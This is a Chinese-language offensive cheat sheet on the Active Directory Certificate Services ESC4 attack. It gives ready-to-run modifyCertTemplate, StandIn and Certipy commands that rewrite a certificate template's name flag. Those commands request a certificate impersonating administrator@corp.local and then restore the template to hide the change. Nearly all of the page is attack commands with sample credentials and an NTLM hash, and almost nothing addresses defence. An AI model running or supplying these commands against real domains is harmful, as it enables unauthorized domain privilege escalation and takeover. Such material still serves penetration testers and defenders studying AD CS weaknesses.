# Active Directory - 证书 ESC4

## ESC4 - 访问控制漏洞

> 为允许域身份验证的模板启用 `mspki-certificate-name-flag` 标志，可以让攻击者"将错误配置推送到模板中，从而引发 ESC1 漏洞"。

* 使用 [modifyCertTemplate](https://github.com/fortalice/modifyCertTemplate) 搜索值为 `00000000-0000-0000-0000-000000000000` 的 `WriteProperty`

  ```ps1
  python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -get-acl
  ```

* 添加 `ENROLLEE_SUPPLIES_SUBJECT`（ESS）标志以执行 ESC1 攻击

  ```ps1
  python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag

  # 为 WebServer 模板添加/移除 ENROLLEE_SUPPLIES_SUBJECT 标志
  C:\>StandIn.exe --adcs --filter WebServer --ess --add
  ```

* 执行 ESC1 攻击后恢复原始值

  ```ps1
  python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -value 0 -property mspki-Certificate-Name-Flag
  ```

使用 Certipy

```ps1
# 覆写配置使其容易受到 ESC1 攻击
certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -save-old
# 基于 ESC4 模板请求证书，方法与 ESC1 相同
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC4' -alt 'administrator@corp.local'
# 恢复旧配置
certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -configuration ESC4.json
```

## 参考资料

* [ADCS: Playing with ESC4 - Matthew Creel](https://www.fortalicesolutions.com/posts/adcs-playing-with-esc4)
